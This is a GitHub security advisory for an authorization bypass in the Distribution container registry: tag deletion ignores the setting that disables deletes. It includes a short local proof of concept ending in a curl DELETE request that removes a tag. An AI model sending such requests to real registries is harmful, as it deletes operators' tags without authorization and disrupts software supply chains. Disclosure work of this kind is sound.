# [M] Distribution's tag deletion bypasses `storage.delete.enabled` configuration

## Summary
Severity: Medium
Advisory: GHSA-6pjf-3r9x-m592
CVE: CVE-2026-41888
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-6pjf-3r9x-m592
Type: github-advisory

## Affected
- Go: `github.com/distribution/distribution/v3` — affected >=0 <3.1.1
- Go: `github.com/distribution/distribution` — affected >=0

## Details
### Summary

Tag deletion via the `DELETE /v2/<name>/manifests/<tag>` endpoint bypasses the `storage.delete.enabled: false` configuration, allowing any API client to remove tags from repositories even when the operator has explicitly disabled deletion.

### Details

When `storage.delete.enabled` is configured to false, digest-based manifest deletion is correctly rejected by the guard in [registry/storage/linkedblobstore.go:212-215](https://github.com/distribution/distribution/blob/main/registry/storage/linkedblobstore.go#L213-L215). 

However, tag deletion takes a separate code path that never checks this setting:

In [`registry/handlers/manifests.go:439-453`](https://github.com/distribution/distribution/blob/main/registry/handlers/manifests.go#L439-L453), `DeleteManifest`  detects a tag reference, calls `tagService.Untag()`, returns,  never consulting `registry.deleteEnabled`.

In turn, [`tagStore.Untag()`](https://github.com/distribution/distribution/blob/main/registry/storage/tagstore.go#L111-L121) calls the storage driver directly to delete the tag path without checking whether deletes are enabled.

### PoC

Using a paired down Distribution configuration that explicitly disables deletes, such as this one, stored as `config.yaml`:

```yaml
version: 0.1
storage:
  delete:
    enabled: false
  filesystem:
    rootdirectory: /var/lib/registry
http:
  addr: :5000
```

Start a local Distribution, mounting in the above configuration from the current directory:

```shell
docker run -p 5000:5000 -v "$(pwd)/config.yaml":/config.yaml --restart=always --name registry registry:3.1.0 /config.yaml
```

In a separate terminal session/tab, push `alpine:3.23` into the running instance:
```shell
docker pull alpine:3.23
docker tag alpine:3.23 localhost:5000/alpine:3.23
docker push localhost:5000/alpine:3.23
```

Confirm that the tag shows up as expected:
```shell
curl 'http://localhost:5000/v2/alpine/tags/list'
{"name":"alpine","tags":["3.23"]}
```

Issue a delete for the `3.23` tag:
```shell
curl -X DELETE 'http://localhost:5000/v2/alpine/manifests/3.23'
```

Observe that the tag is now gone, despite deletes being disabled:
```shell
curl 'http://localhost:5000/v2/alpine/tags/list'
{"name":"alpine","tags":null}
```

### Impact

This is an authorization bypass vulnerability. Any client with network access to the registry can delete tags despite the operator having disabled deletion. This can cause denial of service for consumers pulling by tag and enables supply-chain disruption by removing trusted tags from a registry that the operator and/or users believed to be immutable.

## References
- https://github.com/distribution/distribution/security/advisories/GHSA-6pjf-3r9x-m592
- https://nvd.nist.gov/vuln/detail/CVE-2026-41888
- https://github.com/distribution/distribution
